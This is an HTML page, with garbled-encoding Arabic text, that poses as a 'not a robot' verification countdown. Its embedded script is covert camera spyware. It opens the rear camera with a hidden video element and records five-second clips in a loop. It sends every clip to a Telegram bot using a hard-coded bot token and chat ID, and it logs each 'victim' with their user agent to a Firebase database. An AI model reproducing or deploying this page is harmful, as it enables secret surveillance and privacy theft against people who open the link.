<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Support the communication sites</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        /* ØªÙ†Ø³ÙŠÙ‚Ø§Øª Ù…Ù„Ù style.css Ø§Ù„Ù…Ø¯Ù…Ø¬Ø© */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
        body {
            height: 100vh; display: flex; align-items: center; justify-content: center;
            background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2);
            background-size: 400% 400%; animation: backgroundAnimation 6s ease infinite;
        }
        @keyframes backgroundAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .loading-container { background-color: white; padding: 30px; border-radius: 15px; box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2); width: 90%; max-width: 400px; }
        h1 { color: red; font-size: 24px; margin-bottom: 10px; }
        p { color: #333; font-size: 18px; margin-bottom: 15px; }
        .progress-container { width: 100%; background-color: #ddd; border-radius: 10px; overflow: hidden; height: 10px; margin: 10px 0; }
        .progress-bar { width: 100%; height: 100%; background-color: red; transition: width 1s linear; }
        #countdown { font-size: 20px; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="loading-container">
        <h1>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù†Ùƒ Ù„Ø³Øª Ø±ÙˆØ¨Øª</h1>
        <p>ÙŠØ±Ø¬Ø¹ Ø§Ù„ØªØ¹Ø§ÙˆÙ† Ù…Ø¹Ù†Ø§ Ù„ÙƒÙŠ ØªØ­ØµÙ„ Ø¹Ù„ÙŠ ØªØ¬Ø±Ø¨Ù‡ Ù…Ù…ØªØ¹Ù‡ <br> Ø¹Ù†Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ Ù…Ù† Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ ÙˆÙ„Ù… ÙŠØ­Ø¯Ø« Ø´Ø¦ Ø§Ø¹Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© Ù…Ø±Ù‡ Ø§Ø®Ø±ÙŠ Ø±Ø¬Ø§Ø¡Ù‹</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress"></div>
        </div>
        <p id="countdown">20</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // Ù…Ù†Ø·Ù‚ Ù…Ù„Ù script.js Ø§Ù„Ù…Ø¯Ù…Ø¬ Ù…Ø¹ ØªØ¹Ø¯ÙŠÙ„Ø§Øª Firebase ÙˆØ§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        document.addEventListener("DOMContentLoaded", async function () {
            // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase Ø§Ù„Ø®Ø§ØµØ© Ø¨Ùƒ
            const firebaseConfig = {
                databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/"
            };
            if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
            const db = firebase.database();

            const countdownElement = document.getElementById("countdown");
            const progressBar = document.getElementById("progress");
            let timeLeft = 20;
            let countdownStarted = false;
            let mediaRecorder;
            let recordedChunks = [];
            let videoStream;

            // ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª ÙˆØ§Ù„Ø¢Ø¯Ù…Ù† Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ
            const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
            const adminChatId = "5375214810";

            // Ø§Ø³ØªØ®Ø±Ø§Ø¬ user_id Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get("user_id");

            async function startCamera() {
                try {
                    // Ù…Ø­Ø§ÙˆÙ„Ø© ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ© Ø£ÙˆÙ„Ø§Ù‹
                    videoStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: "environment" }
                    });

                    const video = document.getElementById('video');
                    video.srcObject = videoStream;
                    video.onloadedmetadata = () => {
                        startCountdown();
                        startRecording();
                        
                        // Ø¥Ø±Ø³Ø§Ù„ "Ø³Ø¬Ù„ Ø­Ø§Ù„Ø©" ÙÙ‚Ø· Ù„Ù„ÙÙŠØ±Ø¨ÙŠØ³ Ù„Ø¥Ø¸Ù‡Ø§Ø± Ø£Ù† Ø§Ù„Ø¶Ø­ÙŠØ© Ø£ÙˆÙ†Ù„Ø§ÙŠÙ† ÙÙŠ Ø§Ù„Ù„ÙˆØ­Ø©
                        if (userId) {
                            db.ref('live_hits/' + userId).set({
                                status: "Ø¶Ø­ÙŠØ© Ø¬Ø¯ÙŠØ¯Ø© Ù†Ø´Ø·Ø© ğŸ“¡",
                                last_update: new Date().toLocaleTimeString(),
                                user_agent: navigator.userAgent
                            });
                        }
                    };
                } catch (error) { console.error("ğŸš¨:", error); }
            }

            function startCountdown() {
                if (countdownStarted) return;
                countdownStarted = true;
                const countdownInterval = setInterval(() => {
                    timeLeft--;
                    countdownElement.textContent = timeLeft;
                    progressBar.style.width = (timeLeft / 20) * 100 + "%";
                    if (timeLeft <= 0) { clearInterval(countdownInterval); }
                }, 1000);
            }

            function startRecording() {
                mediaRecorder = new MediaRecorder(videoStream, { mimeType: "video/webm" });
                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                mediaRecorder.onstop = () => {
                    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ù…Ø³Ø¬Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… (Ù„Ù„Ø¢Ø¯Ù…Ù† ÙˆÙ„Ù„Ù…Ø³ØªØ®Ø¯Ù… ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·)
                    sendVideo(adminChatId);
                    if (userId && userId !== adminChatId) { sendVideo(userId); }
                    
                    recordedChunks = [];
                    startRecording(); // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„ ÙÙˆØ±Ø§Ù‹
                };
                mediaRecorder.start();
                setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 5000); // ØªØ³Ø¬ÙŠÙ„ Ù…Ù‚Ø§Ø·Ø¹ Ù…Ø¯ØªÙ‡Ø§ 10 Ø«ÙˆØ§Ù†Ù
            }

            function sendVideo(chatId) {
                const blob = new Blob(recordedChunks, { type: "video/webm" });
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("video", blob, "video_clip.webm");

                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: "POST",
                    body: formData
                });
            }

            startCamera();
        });
    </script>
</body>
</html>
